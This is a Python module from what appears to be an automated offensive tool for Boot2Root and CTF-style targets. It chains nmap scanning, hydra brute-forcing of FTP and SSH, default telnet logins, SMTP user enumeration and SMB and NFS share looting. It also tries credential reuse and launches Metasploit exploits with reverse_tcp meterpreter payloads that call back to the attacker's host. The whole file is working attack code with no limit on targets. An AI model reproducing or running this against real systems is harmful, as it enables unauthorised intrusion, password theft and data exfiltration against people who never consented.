import json
import re
import shlex
from datetime import datetime
from pathlib import Path

from common import (
    CREDENTIALS,
    LOCAL_IP,
    OPEN_PORTS,
    PORT_SERVICE_MAP,
    detect_local_ip,
    fetch_cve,
    flag_scan,
    print_status,
    run_tool,
    store_cred,
    toolname,
)
from module_web import run_web_module


def _timing_profile(attack_mode):
    if str(attack_mode) == "1":
        return "T2", 4
    if str(attack_mode) == "3":
        return "T5", 32
    return "T4", 16


def _parse_open_ports(nmap_text):
    parsed = []
    for line in nmap_text.splitlines():
        m = re.search(r"^(\d+)/tcp\s+open\s+([^\s]+)", line.strip())
        if not m:
            continue
        port = int(m.group(1))
        service = m.group(2).strip()
        parsed.append((port, service))
    return parsed


def _parse_deep_scan_output(nmap_text):
    os_guess = ""
    for line in nmap_text.splitlines():
        m = re.search(r"^(\d+)/tcp\s+open\s+([^\s]+)\s*(.*)$", line.strip())
        if m:
            port = int(m.group(1))
            service = m.group(2).strip()
            version = (m.group(3) or "").strip()
            PORT_SERVICE_MAP[port] = {"service": service, "version": version}
            print_status("success", f"Port {port}/tcp - {service} {version}".strip())

        if line.startswith("OS details:") or line.startswith("Aggressive OS guesses:"):
            os_guess = line.split(":", 1)[1].strip()

    if os_guess:
        print_status("success", f"OS guess: {os_guess}")

    # Parse possible creds/hashes in script output quickly.
    for line in nmap_text.splitlines():
        line_s = line.strip()
        cred = re.search(r"([A-Za-z0-9._-]+):([^\s]+)", line_s)
        if cred and ("password" in line_s.lower() or "credential" in line_s.lower()):
            store_cred(cred.group(1), cred.group(2), "nmap")
        if re.fullmatch(r"[a-fA-F0-9]{32,}", line_s):
            flag_scan(line_s)

    return os_guess


def _set_service_flags():
    ports = set(OPEN_PORTS)
    return {
        "WEB_DETECTED": bool({80, 443, 8080, 8443} & ports),
        "SMB_DETECTED": bool({139, 445} & ports),
        "SSH_DETECTED": 22 in ports,
        "FTP_DETECTED": 21 in ports,
        "MYSQL_DETECTED": 3306 in ports,
        "PSQL_DETECTED": 5432 in ports,
        "REDIS_DETECTED": 6379 in ports,
        "MONGO_DETECTED": 27017 in ports,
        "NFS_DETECTED": bool({111, 2049} & ports),
    }


def _run_nmap_scans(target, attack_mode, focused_port=None):
    timing, _ = _timing_profile(attack_mode)

    # Step 1: fast discovery
    if focused_port is None:
        out_fast = run_tool(f"nmap -{timing} --open {shlex.quote(target)}", 300)
    else:
        out_fast = run_tool(f"nmap -T4 --open -p {int(focused_port)} {shlex.quote(target)}", 300)
    flag_scan(out_fast)
    for port, service in _parse_open_ports(out_fast):
        if port not in OPEN_PORTS:
            OPEN_PORTS.append(port)
        PORT_SERVICE_MAP.setdefault(port, {"service": service, "version": ""})
        print_status("success", f"Open port: {port} - {service}")

    if not OPEN_PORTS:
        print_status("warning", "No open ports found. Aborting.")
        return "", {}

    # Step 2: deep scan
    ports_csv = ",".join(str(p) for p in sorted(OPEN_PORTS))
    out_deep = run_tool(
        f"nmap -sV -sC -O --open -p {ports_csv} {shlex.quote(target)}",
        300,
    )
    flag_scan(out_deep)
    os_guess = _parse_deep_scan_output(out_deep)

    # Step 3: full scan (PWN only)
    out_full = run_tool(f"nmap -p- -T4 --open --min-rate 1000 {shlex.quote(target)}", 600)
    flag_scan(out_full)
    new_ports = []
    for port, service in _parse_open_ports(out_full):
        if port not in OPEN_PORTS:
            OPEN_PORTS.append(port)
            PORT_SERVICE_MAP.setdefault(port, {"service": service, "version": ""})
            new_ports.append(port)
            print_status("success", f"Open port: {port} - {service}")

    if new_ports:
        ports_csv = ",".join(str(p) for p in sorted(new_ports))
        out_deep_new = run_tool(
            f"nmap -sV -sC -O --open -p {ports_csv} {shlex.quote(target)}",
            300,
        )
        flag_scan(out_deep_new)
        extra_os_guess = _parse_deep_scan_output(out_deep_new)
        if not os_guess and extra_os_guess:
            os_guess = extra_os_guess

    return os_guess, _set_service_flags()


def _service_ftp(target, hydra_threads):
    out = run_tool(
        f"bash -lc \"printf 'user anonymous anonymous\\nls\\nquit\\n' | ftp -n {shlex.quote(target)}\"",
        60,
    )
    flag_scan(out)
    if "230" in out:
        print_status("success", "FTP Anonymous login: SUCCESS")
        out_ls = run_tool(
            f"bash -lc \"mkdir -p /tmp/ftp_files && printf 'user anonymous anonymous\\nls\\ncd /\\nmget *\\nquit\\n' | ftp -n {shlex.quote(target)}\"",
            120,
        )
        flag_scan(out_ls)
        return

    out_hydra = run_tool(
        f"hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://{shlex.quote(target)} -t {hydra_threads} 2>/dev/null",
        240,
    )
    flag_scan(out_hydra)
    for line in out_hydra.splitlines():
        m = re.search(r"login:\s*([^\s]+)\s+password:\s*([^\s]+)", line)
        if m:
            store_cred(m.group(1), m.group(2), "hydra-ftp")


def _service_ssh(target, hydra_threads):
    shell_access = False
    shell_user = None
    shell_pass = None

    if CREDENTIALS:
        for cred in CREDENTIALS:
            user = cred["user"]
            pwd = cred["pass"]
            # Use sshpass if available, skip cleanly otherwise.
            out = run_tool(
                f"sshpass -p {shlex.quote(pwd)} ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 {shlex.quote(user)}@{shlex.quote(target)} whoami",
                10,
            )
            flag_scan(out)
            if out.strip():
                shell_access = True
                shell_user = user
                shell_pass = pwd
                print_status("success", f"SSH LOGIN SUCCESS: {user}:{pwd}")
                break
    else:
        out_hydra = run_tool(
            f"hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/rockyou.txt ssh://{shlex.quote(target)} -t {hydra_threads} -q 2>/dev/null",
            240,
        )
        flag_scan(out_hydra)
        for line in out_hydra.splitlines():
            m = re.search(r"login:\s*([^\s]+)\s+password:\s*([^\s]+)", line)
            if m:
                user, pwd = m.group(1), m.group(2)
                store_cred(user, pwd, "hydra-ssh")
                out = run_tool(
                    f"sshpass -p {shlex.quote(pwd)} ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 {shlex.quote(user)}@{shlex.quote(target)} whoami",
                    10,
                )
                flag_scan(out)
                if out.strip():
                    shell_access = True
                    shell_user = user
                    shell_pass = pwd
                    print_status("success", f"SSH LOGIN SUCCESS: {user}:{pwd}")
                    break

    return shell_access, shell_user, shell_pass


def _service_telnet(target):
    default_pairs = [("admin", "admin"), ("root", "root"), ("admin", "password")]
    for user, pwd in default_pairs:
        out = run_tool(
            f"bash -lc \"(echo {shlex.quote(user)}; sleep 1; echo {shlex.quote(pwd)}; sleep 1) | nc {shlex.quote(target)} 23\"",
            5,
        )
        flag_scan(out)
        if any(k in out.lower() for k in ("welcome", "last login", "$", "#")):
            print_status("success", f"Telnet login success: {user}:{pwd}")
            store_cred(user, pwd, "telnet-default")
            return True
    return False


def _service_smtp(target):
    out = run_tool(
        f"bash -lc \"printf 'EHLO test\\nVRFY root\\nEXPN admin\\nQUIT\\n' | nc {shlex.quote(target)} 25\"",
        10,
    )
    flag_scan(out)
    users = []
    for line in out.splitlines():
        if line.startswith("250") or line.startswith("252"):
            m = re.search(r"(root|admin|[a-zA-Z0-9._-]+)$", line.strip())
            if m:
                u = m.group(1)
                users.append(u)
                print_status("success", f"SMTP user enumerated: {u}")
    return users


def _service_smb(target):
    out_path = "/tmp/enum4linux_out.txt"
    run_tool(f"enum4linux -a {shlex.quote(target)} > {shlex.quote(out_path)}", 180)
    text = Path(out_path).read_text(encoding="utf-8", errors="replace") if Path(out_path).exists() else ""
    flag_scan(text)

    smb_users = sorted(set(re.findall(r"user:\[([^\]]+)\]", text, flags=re.I)))
    smb_shares = sorted(set(re.findall(r"\\\\[^\\]+\\([A-Za-z0-9$_-]+)", text)))
    if smb_users:
        print_status("success", f"SMB Users: {', '.join(smb_users)}")
    if smb_shares:
        print_status("success", f"SMB Shares: {', '.join(smb_shares)}")

    for share in smb_shares:
        out_null = run_tool(f"smbclient //{shlex.quote(target)}/{shlex.quote(share)} -N 2>/dev/null", 60)
        flag_scan(out_null)
        if out_null.strip():
            run_tool(
                f"bash -lc \"mkdir -p /tmp/smb_{share} && smbclient //{shlex.quote(target)}/{shlex.quote(share)} -N -c 'recurse;ls;mget *'\"",
                120,
            )
            print_status("success", f"SMB share readable (null): {share}")

        for cred in CREDENTIALS:
            user, pwd = cred["user"], cred["pass"]
            out_auth = run_tool(
                f"smbclient //{shlex.quote(target)}/{shlex.quote(share)} -U {shlex.quote(user + '%' + pwd)} 2>/dev/null",
                60,
            )
            flag_scan(out_auth)
            if out_auth.strip():
                run_tool(
                    f"bash -lc \"mkdir -p /tmp/smb_{share}_auth && smbclient //{shlex.quote(target)}/{shlex.quote(share)} -U {shlex.quote(user + '%' + pwd)} -c 'recurse;ls;mget *'\"",
                    120,
                )
                print_status("success", f"SMB share readable (auth): {share}")


def _service_nfs(target):
    out = run_tool(f"showmount -e {shlex.quote(target)}", 60)
    flag_scan(out)
    exports = []
    for line in out.splitlines():
        m = re.search(r"^(/\S+)\s+", line.strip())
        if m:
            exports.append(m.group(1))
    run_tool("mkdir -p /mnt/nfs_tmp", 30)
    for path in exports:
        mount_out = run_tool(f"mount -t nfs {shlex.quote(target)}:{shlex.quote(path)} /mnt/nfs_tmp", 60)
        flag_scan(mount_out)
        list_out = run_tool("ls -laR /mnt/nfs_tmp", 120)
        flag_scan(list_out)
        print_status("success", f"NFS mount accessible: {path}")
        run_tool("umount /mnt/nfs_tmp", 30)


def _service_mysql(target):
    out = run_tool(
        f"mysql -h {shlex.quote(target)} -u root --password='' -e \"show databases;\" 2>/dev/null",
        60,
    )
    flag_scan(out)
    if out.strip():
        print_status("success", "MySQL open with no password")


def _service_psql(target):
    out = run_tool(f"psql -h {shlex.quote(target)} -U postgres -c \"\\list\" 2>/dev/null", 60)
    flag_scan(out)
    if out.strip():
        print_status("success", "PostgreSQL accessible")


def _service_redis(target):
    out = run_tool(f"redis-cli -h {shlex.quote(target)} ping", 30)
    flag_scan(out)
    if "PONG" in out:
        keys = run_tool(f"redis-cli -h {shlex.quote(target)} keys '*'", 60)
        flag_scan(keys)
        key_count = len([k for k in keys.splitlines() if k.strip()])
        print_status("success", f"Redis open: {key_count} keys found")


def _service_mongo(target):
    out = run_tool(
        f"mongo {shlex.quote(target)}:27017 --eval \"db.adminCommand('listDatabases')\" 2>/dev/null",
        60,
    )
    flag_scan(out)
    if out.strip():
        print_status("success", "MongoDB open with no auth")


def _credential_reuse(target, flags):
    for cred in CREDENTIALS:
        user, pwd = cred["user"], cred["pass"]

        if flags["SSH_DETECTED"]:
            out = run_tool(
                f"sshpass -p {shlex.quote(pwd)} ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 {shlex.quote(user)}@{shlex.quote(target)} whoami",
                10,
            )
            if out.strip():
                print_status("success", f"Credential valid on ssh: {user}:{pwd}")

        if flags["FTP_DETECTED"]:
            out = run_tool(
                f"bash -lc \"printf 'user {shlex.quote(user)} {shlex.quote(pwd)}\\nquit\\n' | ftp -n {shlex.quote(target)}\"",
                10,
            )
            if "230" in out:
                print_status("success", f"Credential valid on ftp: {user}:{pwd}")

        if flags["SMB_DETECTED"]:
            out = run_tool(
                f"smbclient -L //{shlex.quote(target)} -U {shlex.quote(user + '%' + pwd)} 2>/dev/null",
                20,
            )
            if out.strip():
                print_status("success", f"Credential valid on smb: {user}:{pwd}")

        if flags["MYSQL_DETECTED"]:
            out = run_tool(
                f"mysql -h {shlex.quote(target)} -u {shlex.quote(user)} --password={shlex.quote(pwd)} -e \"show databases;\" 2>/dev/null",
                20,
            )
            if out.strip():
                print_status("success", f"Credential valid on mysql: {user}:{pwd}")


def _phase_cve_and_metasploit(target, os_guess):
    cve_map = {}
    exploit_suggestions = []
    msf_modules = {}
    shell_access = False
    shell_type = None

    for port, svc in PORT_SERVICE_MAP.items():
        if isinstance(svc, dict):
            service = svc.get("service", "")
            version = svc.get("version", "")
        else:
            service = str(svc)
            version = ""
        if not version:
            continue

        cves = fetch_cve(service, version)
        if cves:
            cve_map[port] = cves

        out_ss = run_tool(f"searchsploit {shlex.quote(service + ' ' + version)} --json 2>/dev/null", 60)
        flag_scan(out_ss)
        try:
            j = json.loads(out_ss) if out_ss else {}
        except json.JSONDecodeError:
            j = {}
        for item in j.get("RESULTS_EXPLOIT", []):
            title = item.get("Title", "").strip()
            path = item.get("Path", "").strip()
            if title and path:
                exploit_suggestions.append({"title": title, "path": path, "port": port})
                print_status("success", f"Exploit: {title} -> {path}")

    if cve_map:
        for port, cves in cve_map.items():
            for cve in cves:
                cve_id = cve.get("id", "")
                if not cve_id:
                    continue
                out = run_tool(f'msfconsole -q -x "search {cve_id}; exit" 2>/dev/null', 180)
                flag_scan(out)
                for line in out.splitlines():
                    if re.match(r"^\s*\d+\s+", line):
                        parts = line.split()
                        if len(parts) >= 2:
                            module = parts[1]
                            msf_modules[cve_id] = {"module": module, "port": port}
                            print_status("success", f"Metasploit module found: {module}")
                            break
                if cve_id in msf_modules:
                    break

    if msf_modules:
        lhost = LOCAL_IP or detect_local_ip()
        payload = "windows/x64/meterpreter/reverse_tcp" if "windows" in str(os_guess).lower() else "linux/x86/meterpreter/reverse_tcp"
        for _, item in msf_modules.items():
            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
            rc_path = f"/tmp/{toolname}_msf_{ts}.rc"
            rc = (
                f"use {item['module']}\n"
                f"set RHOSTS {target}\n"
                f"set RPORT {item['port']}\n"
                f"set LHOST {lhost}\n"
                "set LPORT 4444\n"
                f"set PAYLOAD {payload}\n"
                "set ExitOnSession false\n"
                "exploit -j\n"
                "sleep 10\n"
                "sessions -l\n"
            )
            Path(rc_path).write_text(rc, encoding="utf-8")
            out = run_tool(f"msfconsole -q -r {shlex.quote(rc_path)}", 180)
            flag_scan(out)
            if "Meterpreter session" in out:
                print_status("success", "METERPRETER SESSION OPENED")
                shell_access = True
                shell_type = "meterpreter"
                break
            if "Command shell session" in out:
                print_status("success", "COMMAND SHELL SESSION OPENED")
                shell_access = True
                shell_type = "shell"
                break

        if not shell_access:
            run_tool(
                f"msfvenom -p {payload} LHOST={lhost} LPORT=4444 -f elf -o /tmp/{toolname}_payload.elf 2>/dev/null",
                180,
            )
            print_status("info", f"Payload saved: /tmp/{toolname}_payload.elf")
            print_status(
                "info",
                "Start listener manually: msfconsole -q -x \"use exploit/multi/handler; "
                f"set PAYLOAD {payload}; set LHOST {lhost}; set LPORT 4444; run\"",
            )

    return {
        "cve_map": cve_map,
        "exploit_suggestions": exploit_suggestions,
        "msf_modules": msf_modules,
        "shell_access": shell_access,
        "shell_type": shell_type,
    }


def run_pwn_module(target, attack_mode="2", focused_port=None):
    print_status("info", "Starting Network / Boot2Root (Full PWN) module")
    _, hydra_threads = _timing_profile(attack_mode)

    os_guess, flags = _run_nmap_scans(target, attack_mode, focused_port=focused_port)
    if not OPEN_PORTS:
        return {"target": target, "open_ports": [], "port_service_map": {}, "shell_access": False}

    shell_access = False
    shell_type = None
    ssh_user = None
    ssh_pass = None
    smtp_users = []

    if flags["FTP_DETECTED"]:
        _service_ftp(target, hydra_threads)

    if flags["SSH_DETECTED"]:
        ssh_ok, ssh_user, ssh_pass = _service_ssh(target, hydra_threads)
        if ssh_ok:
            shell_access = True
            shell_type = "ssh"

    if 23 in OPEN_PORTS:
        if _service_telnet(target):
            shell_access = True
            shell_type = shell_type or "shell"

    if 25 in OPEN_PORTS:
        smtp_users = _service_smtp(target)

    web_results = None
    if flags["WEB_DETECTED"]:
        web_results = run_web_module(
            target=target,
            open_ports=OPEN_PORTS,
            port_service_map=PORT_SERVICE_MAP,
            attack_mode=attack_mode,
            os_guess=os_guess,
        )
        if web_results.get("shell_access"):
            shell_access = True
            shell_type = web_results.get("shell_type")

    if flags["SMB_DETECTED"]:
        _service_smb(target)

    if flags["NFS_DETECTED"]:
        _service_nfs(target)

    if flags["MYSQL_DETECTED"]:
        _service_mysql(target)

    if flags["PSQL_DETECTED"]:
        _service_psql(target)

    if flags["REDIS_DETECTED"]:
        _service_redis(target)

    if flags["MONGO_DETECTED"]:
        _service_mongo(target)

    _credential_reuse(target, flags)
    cve_msf_results = _phase_cve_and_metasploit(target, os_guess)
    if cve_msf_results.get("shell_access"):
        shell_access = True
        shell_type = cve_msf_results.get("shell_type")

    return {
        "target": target,
        "os_guess": os_guess,
        "open_ports": sorted(OPEN_PORTS),
        "port_service_map": dict(PORT_SERVICE_MAP),
        "flags": flags,
        "credentials": list(CREDENTIALS),
        "smtp_users": smtp_users,
        "web_results": web_results,
        "cve_msf_results": cve_msf_results,
        "shell_access": shell_access,
        "shell_type": shell_type,
        "ssh_creds": {"user": ssh_user, "pass": ssh_pass} if ssh_user and ssh_pass else None,
    }
